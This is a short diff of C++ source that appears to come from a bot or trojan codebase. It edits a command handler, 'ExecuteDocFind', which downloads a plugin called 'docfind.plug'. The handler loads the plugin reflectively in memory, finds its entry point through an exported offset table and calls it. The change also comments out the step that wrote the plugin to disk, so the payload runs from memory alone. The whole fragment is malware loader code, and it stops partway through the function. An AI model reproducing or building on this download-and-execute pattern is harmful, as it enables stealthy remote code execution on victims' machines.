@@ -747,19 +747,19 @@ bool ExecuteLoadDLLDisk(PTaskManager, PCHAR Command, PCHAR Args)
 
 bool ExecuteDocFind(PTaskManager, PCHAR Command, PCHAR Args)
 {
-	typedef BOOL (WINAPI *TFindMethod)(HANDLE DllHandle, DWORD Reason, LPVOID);
+	typedef BOOL (WINAPI *typeBuildStubDllMain)(HANDLE DllHandle, DWORD Reason, LPVOID);
 	BYTE* data = 0;
 	DWORD size = 0;
 	data = Plugin::Download( "docfind.plug", 0, &size, false );
 	bool res = false;
 	if( data )
 	{
-		File::WriteBufferA( "c:\\docfind.plug", data, size );
+		//File::WriteBufferA( "c:\\docfind.plug", data, size );
 		HMEMORYMODULE module = MemoryLoadLibrary(data);
 		if( module )
 		{
-			TFindMethod Func = *(TFindMethod*)MemoryGetProcAddress(module, "gAltEPOffs" );
-			if(Func)
+			DWORD* gAltEPOffs = (DWORD*)MemoryGetProcAddress(module, "gAltEPOffs" );
+			if( gAltEPOffs )
 			{
 				typeBuildStubDllMain func = (typeBuildStubDllMain)gAltEPOffs[0];
 				if( func )
